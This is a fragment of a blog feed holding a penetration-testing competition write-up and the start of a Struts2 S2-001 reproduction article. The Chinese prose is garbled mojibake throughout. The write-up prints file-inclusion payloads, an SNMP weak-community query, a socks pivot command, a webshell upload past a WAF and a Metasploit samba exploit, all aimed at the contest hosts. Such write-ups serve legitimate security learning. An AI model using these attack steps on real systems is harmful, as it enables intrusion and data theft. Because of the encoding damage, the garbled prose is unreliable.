    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ—¶éš”ä¸€å¹´å†æ¬¡å‚åŠ é“ä¸‰ï¼Œä»Šå¹´çš„èµ›åˆ¶æœ‰ç‚¹æ”¹åŠ¨ï¼Œä¼ä¸šèµ›ä¸ªäººèµ›å’Œæ•°æ®èµ›ä¸‰åœºåœ¨åŒä¸€å¤©è¿›è¡Œï¼Œåœ¨é˜Ÿå‹ä»¬çš„å¸¦é¢†ä¸‹æ··äº†ä¸ªèµ›åŒºç¬¬äºŒåï¼ŒæˆåŠŸæ™‹çº§å†³èµ›ã€‚æœ¬æ¬¡æ¯”èµ›ä¸­æˆ‘ä¸»è¦è´Ÿè´£çš„æ˜¯ä¼ä¸šèµ›éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯å¯¹ç»™å®šç›®æ ‡è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç„¶åä¸­é—´ç©¿æ’ç€åšäº†å‡ é“æ•°æ®èµ›çš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚ï¼ˆå› ä¸ºæ¯”èµ›è¿‡ç¨‹ä¸­æ²¡æ€ä¹ˆæˆªå›¾ï¼Œå¸ˆå‚…ä»¬åˆ«æ‰“æˆ‘ï¼‰</p>
<a id="more"></a>
<h2 id="0x00-ä¼ä¸šèµ›ï¼Œå¯åŠ¨"><a href="#0x00-ä¼ä¸šèµ›ï¼Œå¯åŠ¨" class="headerlink" title="0x00 ä¼ä¸šèµ›ï¼Œå¯åŠ¨"></a>0x00 ä¼ä¸šèµ›ï¼Œå¯åŠ¨</h2><p>æ¯”èµ›å¼€å§‹ï¼Œä»å¹³å°é‡Œå¯ä»¥çœ‹åˆ°ç»™äº†ä¸¤ä¸ªip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">202.1.2.50</span><br><span class="line">202.1.2.60</span><br></pre></td></tr></table></figure><br>å…ˆä»50è¿™å°ä¸‹æ‰‹ï¼Œnmapæ‰«æå¾—åˆ°å‡ ä¸ªç«¯å£ï¼š80,137,3389ç­‰<br>è¿™é‡ŒåŸºæœ¬å¯ä»¥çŸ¥é“æ˜¯å°windowsæœåŠ¡å™¨äº†ï¼ˆå¯èƒ½æœ‰msç³»åˆ—æ¼æ´æˆ–è€…å¯ä»¥3389çˆ†ç ´ä¸€æ³¢ï¼‰ï¼Œ<br>æ‰“å¼€æµè§ˆå™¨ç›´æ¥è®¿é—®å‘ç°æ˜¯ä¸ªphpé¡µé¢ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæºä»£ç æç¤ºåŒ…å«Tips.phpï¼Œç›´æ¥ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;Tips.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><br>è¯»ä¸€ä¸‹æºç ï¼Œå¾—åˆ°æç¤ºï¼š<code>Have you ever heard of SNMP information trasures??</code><br>å…ˆä¸ç®¡æç¤ºï¼Œfuzzè¯»å–äº†ä¸€ä¸‹<code>flag.php</code>ï¼Œç›´æ¥è¯»å–åˆ°flag5ï¼Œæ‹¿ä¸‹100åˆ†ï¼Œè¿™é‡Œå¼€äº†ä¸ªè„‘æ´ï¼Œcç›˜æ ¹ç›®å½•ä¼šä¸ä¼šä¹Ÿæœ‰ä¸ªflagå‘¢ï¼Ÿ<br>äºæ˜¯å°è¯•è¯»å–<code>c:\\flag.txt</code>ï¼Œæœç„¶ï¼Œè¯»åˆ°äº†flag4ï¼Œåˆæ‹¿ä¸‹100åˆ†ã€‚ï¼ˆè¿™é‡Œå·¥ä½œäººå‘˜è¿‡æ¥é—®æˆ‘æ˜¯ä¸æ˜¯æ‹¿åˆ°äº†æœåŠ¡å™¨æƒé™ï¼Œæ€ä¹ˆè¿™ä¹ˆå¿«ï¼Œåªèƒ½å‘Šè¯‰ä»–æˆ‘æ˜¯é æ„è¯†çŒœçš„flagï¼‰  </p>
<h2 id="0x01-æ‹¿ä¸‹æœåŠ¡å™¨"><a href="#0x01-æ‹¿ä¸‹æœåŠ¡å™¨" class="headerlink" title="0x01 æ‹¿ä¸‹æœåŠ¡å™¨"></a>0x01 æ‹¿ä¸‹æœåŠ¡å™¨</h2><p>å†å›åˆ°æç¤ºï¼Œé€šè¿‡æœç´¢å¼•æ“ï¼Œæ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š<a href="http://www.freebuf.com/column/144144.html" target="_blank" rel="noopener">ä¸€æ¬¡å¯¹SNMPæœåŠ¡çš„æ¸—é€æµ‹è¯•</a><br>æ–‡ä¸­ç»™å‡ºäº†å¤šç§æ–¹æ³•å¯¹SNMPæœåŠ¡è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨äº†<code>metasploit</code>çš„<code>auxiliary/scanner/snmp/snmp_login</code>ï¼Œè®¾ç½®ä¸€ä¸‹å‚æ•°ç„¶åè¿è¡Œï¼Œè·‘å‡ºSNMPå­˜åœ¨å¼±å¯†ç ï¼Œå¯ä»¥ç›´æ¥è¯»å–ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ä¸€æ³¢<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v1 -c admin <span class="number">202</span>.<span class="number">1</span>.<span class="number">2</span>.<span class="number">50</span></span><br></pre></td></tr></table></figure><br>ç„¶åè¿”å›äº†ä¸€å¤§å †ç³»ç»Ÿæ•æ„Ÿï¼Œæœ‰ç”¨æˆ·åˆ—è¡¨ï¼Œipä¿¡æ¯ç­‰ç­‰ï¼Œåœ¨ç”¨æˆ·åˆ—è¡¨é‚£é‡Œå‘ç°äº†ä¸€ä¸ªåä¸º<code>libai</code>çš„ç”¨æˆ·ï¼Œéšæ‰‹<code>mstsc</code>è¿æ¥3389æµ‹è¯•ä¸€ä¸‹å¼±å£ä»¤ï¼Œæœä¸å…¶ç„¶ï¼Œ<code>libai</code>ç”¨æˆ·çš„å¯†ç ä¸º<code>admin</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿˜æœ‰ç®¡ç†å‘˜æƒé™ï¼Œè¿™é‡Œå°±ç®—æ˜¯å½»åº•æ‹¿ä¸‹50è¿™å°æœåŠ¡å™¨äº†<br>åœ¨æœåŠ¡å™¨é‡Œæ¢ç´¢ä¸€æ³¢ï¼Œå‘ç°httpæœåŠ¡æ˜¯ç”¨<code>phpstudy</code>æ­å»ºçš„ï¼Œç”¨phpstudyè¿æ¥è¿›mysqlæ•°æ®åº“ï¼Œåœ¨testæ•°æ®åº“é‡Œæ‰¾åˆ°flag6<br>ç„¶åå…¨å±€æœç´¢æ–‡ä»¶ï¼Œæœç´¢åˆ°ä¸¤ä¸ªåå­—å¸¦æœ‰flagçš„å›¾ç‰‡æ–‡ä»¶ï¼Œè®©é˜Ÿå‹å»åšäº†ï¼Œä¸è¿‡ä¹Ÿæ²¡åšå‡ºå•¥  </p>
<h2 id="0x02-å†…ç½‘æ¸—é€"><a href="#0x02-å†…ç½‘æ¸—é€" class="headerlink" title="0x02 å†…ç½‘æ¸—é€"></a>0x02 å†…ç½‘æ¸—é€</h2><p>æœåŠ¡å™¨ç¿»å¾—å·®ä¸å¤šäº†ï¼Œå†…ç½‘æ¢æµ‹ä¸€æ³¢ï¼Œå‘ç°å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.2 å¼€å¯80ï¼Œ53ç«¯å£</span><br><span class="line">192.168.1.43 8080ç«¯å£å­˜åœ¨ä¸€ä¸ªdotcms</span><br></pre></td></tr></table></figure><br>.2è¿™å°æ„Ÿè§‰æ˜¯å°dnsæœåŠ¡å™¨ï¼Œä¸è¿‡æ²¡æœ‰ä»€ä¹ˆæ€è·¯ï¼Œå…ˆä»dotå¼€å§‹å§ï¼Œè¿™é‡Œå› ä¸ºdotåœ¨50çš„å†…ç½‘ï¼Œæ‹·å·¥å…·è¿›å»æ¸—é€å¾ˆä¸æ–¹ä¾¿ï¼Œåœ¨50ä¸Šç”¨ewè·‘äº†ä¸ªsocks5ä»£ç†ï¼ŒæŠŠ50å½“ä½œè·³æ¿<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l <span class="number">1080</span></span><br></pre></td></tr></table></figure><br>ç„¶åæœ¬åœ°é…ä¸ªä»£ç†å°±èƒ½ç›´æ¥è®¿é—®äº†ï¼Œæœç´¢å¼•æ“æŸ¥åˆ°è¯¥ç‰ˆæœ¬çš„dotcmså­˜åœ¨ä¸€ä¸ªsqlæ³¨å…¥å’Œä¸€ä¸ªåå°getshellæ¼æ´ï¼Œä½†æ˜¯æ³¨å…¥è¿˜æ˜¯ç›²æ³¨ï¼Œå¥½éº»çƒ¦<br>åå°æµ‹äº†ä¸€æ³¢å¼±å£ä»¤ï¼Œæœªæœï¼Œçªç„¶å‘ç°åœ¨æ™®é€šç”¨æˆ·ç™»å½•ç•Œé¢æœ‰ä¸ªé‚®ç®±å’Œå¯†ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bill@xxxxx.com (å…·ä½“çš„æˆ‘å¿˜äº†ï¼)</span><br><span class="line">bill</span><br></pre></td></tr></table></figure><br>çŒœæµ‹å®ƒä¹Ÿæ˜¯åå°ç®¡ç†å‘˜å¸å·ï¼Œç›´æ¥ç™»é™†ï¼Œæœç„¶æˆåŠŸäº†ï¼Œç„¶åç”¨åå°getshellæ¼æ´æ¥getshell<br>å‚è€ƒåœ°å€:<a href="http://seclists.org/fulldisclosure/2017/Jul/33" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2017/Jul/33</a><br>å‚è€ƒæ–‡ç« ï¼Œæ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œè¿™é‡Œæˆ‘ç”¨firefoxçš„ä¿®æ”¹æ•°æ®åŒ…åŠŸèƒ½æ„é€ äº†<code>ä»»æ„æ–‡ä»¶ä¸Šä¼ </code>çš„åŒ…ï¼Œä¼ äº†ä¸ªjspç½‘é©¬ï¼Œè¿™é‡Œå› ä¸ºåå°æœ‰wafçš„åŸå› ï¼Œè¿˜æ˜¯ä¸Šäº†ä¸ªå…æ€é©¬æ‰æˆåŠŸçš„ï¼Œæ€»ä¹‹æ‹¿åˆ°äº†shell<br><img src="/img/2018-t3sec-1.png" alt=""><br>å› ä¸ºæ˜¯<code>jspç½‘ç«™</code>çš„åŸå› ï¼Œç›´æ¥å°±æ˜¯<code>administrator</code>æƒé™äº†ï¼Œåœ¨cç›˜å‘ç°äº†flag2ï¼Œå½“æ—¶æ—¶é—´æœ‰é™è€Œä¸”è¿™å°æœåŠ¡å™¨æ²¡æœ‰å¼€å¯3389ï¼Œæ²¡æœ‰ç»§ç»­æ·±å…¥æŒ–æ˜ï¼Œåæ¥å¬è¯´dotçš„å‰ç«¯é¡µé¢ä¹Ÿæœ‰ä¸ªflagï¼Œç„¶åè¿˜æœ‰ä¸ªflagåœ¨å›æ”¶ç«™é‡Œï¼Œè„‘æ´æœç„¶å¤Ÿå¤§ï¼Œé™„ä¸ŠcmdæŸ¥çœ‹å›æ”¶ç«™å‘½ä»¤ï¼š<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> $recycle.bin</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-FTPæœåŠ¡å™¨"><a href="#0x03-FTPæœåŠ¡å™¨" class="headerlink" title="0x03 FTPæœåŠ¡å™¨"></a>0x03 FTPæœåŠ¡å™¨</h2><p>æ¥ç€å¯¹60æœåŠ¡å™¨è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œnmapæ‰«æï¼Œå‘ç°å¼€å¯äº†21ï¼Œ22ï¼Œ445ï¼Œæœ‰ä¸ªftpæœåŠ¡ï¼Œå½“æ—¶æŸ¥äº†ä¸€ä¸‹ftpç‰ˆæœ¬ï¼Œæ²¡å•¥æ¼æ´ï¼Œç„¶åç”¨<code>hydra</code>çˆ†ç ´ä¸€æ³¢ï¼Œä¹Ÿæ²¡çˆ†å‡ºæ¥ä¸œè¥¿ï¼Œèµ›åå¾—çŸ¥æ˜¯linuxçš„æ°¸æ’ä¹‹è“æ¼æ´ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œå‚è€ƒï¼š<a href="https://bbs.ichunqiu.com/thread-23281-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23281-1-1.html</a><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/samba/is_known_pipename</span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">202</span>.<span class="number">1</span>.<span class="number">2</span>.<span class="number">60</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-æ•°æ®èµ›"><a href="#0x04-æ•°æ®èµ›" class="headerlink" title="0x04 æ•°æ®èµ›"></a>0x04 æ•°æ®èµ›</h2><p>å…ˆè´´ä¸€ä¸‹æœ€ç»ˆç­”æ¡ˆæˆªå›¾ï¼ˆé˜Ÿå‹ä½™è€å¸ˆæˆªçš„å›¾ï¼‰<br><img src="/img/2018-t3sec-2.png" alt=""><br><img src="/img/2018-t3sec-3.png" alt=""><br>å…¶ä¸­å¤§éƒ¨åˆ†é¢˜ç›®åªè¦å¯¹æ¸—é€æµ‹è¯•æœ‰ä¸€å®šçš„äº†è§£ï¼Œä¼šä½¿ç”¨wiresharkä¹‹ç±»çš„æµé‡åˆ†æå·¥å…·ï¼Œéƒ½èƒ½è§£å‡ºï¼Œæˆ‘å°±ä¸è¯¦ç»†è¯´äº†ï¼Œ<br>è®²ä¸€ä¸‹å¡äº†ç‰¹åˆ«ä¹…çš„ä¸¤é“é¢˜ï¼ˆä¸­é—´å·®ç‚¹è·³è¿‡é‚£ç§ï¼Œè¿˜å¥½æ²¡è·³è¿‡ï¼Œæœ€åå…¨éƒ¨åšå‡ºåŠ äº†100å¤šåˆ†ï¼‰ï¼Œä¸€ä¸ªæ˜¯ç¬¬9é¢˜ï¼Œå›¾ç‰‡æœ¨é©¬çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œå…¶å®åªè¦æ‰¾åˆ°å¯¹åº”çš„ä½ç½®ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åcatä¸€ä¸‹å°±èƒ½å‘ç°phpä¸€å¥è¯äº†ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆå¡äº†é‚£ä¹ˆä¹…ï¼‰<br>è¿˜æœ‰ä¸€ä¸ªæ˜¯ç¬¬12é¢˜ï¼Œæ‰¾é»‘å®¢å¾€FTPä¸Šä¼ çš„æ–‡ä»¶åï¼Œå› ä¸ºæŒ‚äº†ä¸ªreGeorgä»£ç†ï¼Œftpåè®®å˜å¾—å¾ˆå¥‡æ€ªï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ‰¾äº†å¥½ä¹…ï¼Œä»¥ä¸ºåé¢è¿˜æœ‰å¾ˆå¤šé¢˜ï¼Œæƒ³å½“ç„¶åœ°ä»¥ä¸ºè¿™é¢˜ä¸€å®šåœ¨ç¬¬8ä¸ªæ•°æ®åŒ…é‡Œï¼Œç»“æœåªæ‰¾åˆ°äº†FTPå¯†ç ï¼Œç„¶åæƒ³äº†æƒ³å»çœ‹çœ‹ç¬¬9ä¸ªåŒ…å§ï¼Œè¿›å»æœç´¢ä¸€ä¸‹FTPåè®®ä¸Šä¼ æ–‡ä»¶çš„å‘½ä»¤<code>STOR</code>ï¼Œç›´æ¥å°±æ‰¾åˆ°äº†</p>
<h2 id="0x05-ä¸ªäººèµ›"><a href="#0x05-ä¸ªäººèµ›" class="headerlink" title="0x05 ä¸ªäººèµ›"></a>0x05 ä¸ªäººèµ›</h2><p>é˜Ÿå‹jakenæ‹¿äº†ä¸ªä¸€è¡€ï¼Œwebç‹—è¡¨ç¤ºè†œæ‹œ</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»Šå¹´åˆ†åŒºèµ›å› ä¸ºå’ŒDefcon Chinaæ’è½¦çš„åŸå› ï¼Œå‡ ä¸ªå¼ºé˜Ÿå¥½åƒéƒ½ä¸æ˜¯ä¸»åŠ›æ¥æ‰“ï¼Œæ²¡æœ‰è¢«åŠæ‰“çš„å¾ˆä¸¥é‡ï¼Œä¸è¿‡è¿˜æ˜¯çœ‹åˆ°äº†è‡ªå·±çš„å¾ˆå¤šä¸è¶³ï¼Œå†…ç½‘æ¸—é€åšåšçš„è¿˜ä¸æ˜¯ç‰¹åˆ«å¥½ï¼Œå¯¹å¾ˆå¤šæ¼æ´æ²¡æœ‰æ•æ„Ÿçš„å—…è§‰ï¼Œå¯¹å‡ ä¸ªå·¥å…·çš„ä½¿ç”¨ä¹Ÿä¸æ˜¯ç‰¹åˆ«ç†Ÿç»ƒï¼Œæ•°æ®åˆ†æå¡é¢˜ä¸¥é‡<br>ä¸è¿‡ç»“æœè¿˜æ˜¯å¥½çš„ï¼Œæ‹¿äº†ä¸ªäºšå†›ï¼ŒæˆåŠŸæ™‹çº§å†³èµ›ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šæ‰“ï½ï¼Œé™„ä¸Šæœ€åæ’è¡Œå›¾<br><img src="/img/2018-t3sec-4.png" alt=""><br>ï¼ˆæœ€åå¼±å¼±åœ°åæ§½ä¸€ä¸‹ï¼Œä»Šå¹´äºšå†›çš„å¥–é‡‘æ¯”å»å¹´1/3åœºåˆ†åŒºèµ›çš„å­£å†›å¥–é‡‘è¿˜å°‘ï¼ï¼‰</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æ—¶éš”ä¸€å¹´å†æ¬¡å‚åŠ é“ä¸‰ï¼Œä»Šå¹´çš„èµ›åˆ¶æœ‰ç‚¹æ”¹åŠ¨ï¼Œä¼ä¸šèµ›ä¸ªäººèµ›å’Œæ•°æ®èµ›ä¸‰åœºåœ¨åŒä¸€å¤©è¿›è¡Œï¼Œåœ¨é˜Ÿå‹ä»¬çš„å¸¦é¢†ä¸‹æ··äº†ä¸ªèµ›åŒºç¬¬äºŒåï¼ŒæˆåŠŸæ™‹çº§å†³èµ›ã€‚æœ¬æ¬¡æ¯”èµ›ä¸­æˆ‘ä¸»è¦è´Ÿè´£çš„æ˜¯ä¼ä¸šèµ›éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯å¯¹ç»™å®šç›®æ ‡è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç„¶åä¸­é—´ç©¿æ’ç€åšäº†å‡ é“æ•°æ®èµ›çš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚ï¼ˆå› ä¸ºæ¯”èµ›è¿‡ç¨‹ä¸­æ²¡æ€ä¹ˆæˆªå›¾ï¼Œå¸ˆå‚…ä»¬åˆ«æ‰“æˆ‘ï¼‰&lt;/p&gt;
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="æµé‡åˆ†æ" scheme="https://www.codemonster.cn/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Struts2Vulsä¹‹S2-001æ¼æ´å¤ç°ä¸ç®€è¦åˆ†æ</title>
    <link href="https://www.codemonster.cn/2018/03/28/2018-struts2-001/"/>
    <id>https://www.codemonster.cn/2018/03/28/2018-struts2-001/</id>
    <published>2018-03-28T14:34:58.000Z</published>
    <updated>2018-07-28T06:19:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç»å†äº†å‡ æ¬¡é¢è¯•ï¼Œæ·±è§‰åœ¨ä¼ä¸šä¸­ï¼Œjavaå®‰å…¨æ˜¯ååˆ†å—é‡è§†çš„ï¼Œäºæ˜¯æ‰“ç®—å¯¹javaå®‰å…¨è¿›è¡Œæ·±å…¥å­¦ä¹ ï¼Œæœ¬ç³»åˆ—æ˜¯å¯¹Struts2çš„æ¼æ´è¿›è¡Œåˆ†æä¸å¤ç°ï¼Œå†™çš„ä¸å¥½æ¬¢è¿å¤§å®¶æŒ‡å‡ºé—®é¢˜ï¼Œæœ¬æ–‡æ‰€æœ‰æºç ä¸poc&amp;expï¼š<a href="https://github.com/xishir/Struts2Vuls/tree/master/S2-001" target="_blank" rel="noopener">https://github.com/xishir/Struts2Vuls/tree/master/S2-001</a><br><a id="more"></a></p>
<h1 id="æ¼æ´æ‘˜è¦"><a href="#æ¼æ´æ‘˜è¦" class="headerlink" title="æ¼æ´æ‘˜è¦"></a>æ¼æ´æ‘˜è¦</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å®˜æ–¹é“¾æ¥ï¼šhttps:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-001</span><br><span class="line">å®˜æ–¹æ¦‚è¿°ï¼šRemote code exploit on form validation error</span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.8</span><br><span class="line">ä¿®å¤æ‘˜è¦ï¼šæ•°æ® re-display æ—¶ç¦æ­¢æ‰§è¡Œ OGNL è¡¨è¾¾å¼</span><br></pre></td></tr></table></figure>
<h1 id="ç®€è¦åŸç†"><a href="#ç®€è¦åŸç†" class="headerlink" title="ç®€è¦åŸç†"></a>ç®€è¦åŸç†</h1><p>åœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚æœç”¨æˆ·æ‰€æäº¤çš„è¡¨å•å‡ºç°<code>éªŒè¯é”™è¯¯</code>ï¼Œåç«¯ä¼šå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œ<code>è§£æå¤„ç†</code>ï¼Œç„¶åè¿”å›å¹¶<code>æ˜¾ç¤ºå¤„ç†ç»“æœ</code>ã€‚  ä¸¾ä¸ªä¾‹å­ï¼Œå½“ä½ æäº¤çš„ç™»å½•è¡¨å•ä¸º<code>username=xishir&amp;password=%{1+1}</code>æ—¶ï¼Œåç«¯éªŒè¯ç™»å½•å¤±è´¥åä¼šè¿”å›ç™»å½•ç•Œé¢å¹¶æ˜¾ç¤ºä½ çš„è¾“å…¥ï¼Œè¿™æ—¶passwordå­—æ®µä¸­çš„OGNLè¡¨è¾¾å¼å·²ç»è¢«è§£æå¤„ç†è¿‡äº†ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤º<code>%{1+1}</code>çš„è§£æç»“æœ<code>2</code>ï¼Œä»è€Œå¯ä»¥æ„é€ payloadè¿›è¡ŒRCEã€‚</p>
<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><h3 id="ä¸‹è½½struts-2-0-1"><a href="#ä¸‹è½½struts-2-0-1" class="headerlink" title="ä¸‹è½½struts-2.0.1"></a>ä¸‹è½½struts-2.0.1</h3><p>åœ°å€ï¼š<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p>
<h3 id="åˆ›å»ºwebå·¥ç¨‹"><a href="#åˆ›å»ºwebå·¥ç¨‹" class="headerlink" title="åˆ›å»ºwebå·¥ç¨‹"></a>åˆ›å»ºwebå·¥ç¨‹</h3><p>ç›®å½•ç»“æ„<br><img src="/img/s2/s2-001-1.png" alt=""><br>è¿™é‡Œæˆ‘æ˜¯ç”¨çš„æ˜¯MyEclipseï¼Œåˆ›å»ºä¸€ä¸ªwebå·¥ç¨‹ï¼Œç„¶åå°†struts-2.0.1ä¸­çš„å‡ ä¸ªjaråŒ…å¯¼å…¥å¹¶æ–°å»ºå¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶<br>web.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>S2-001 Example<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>index.jsp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="meta-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span 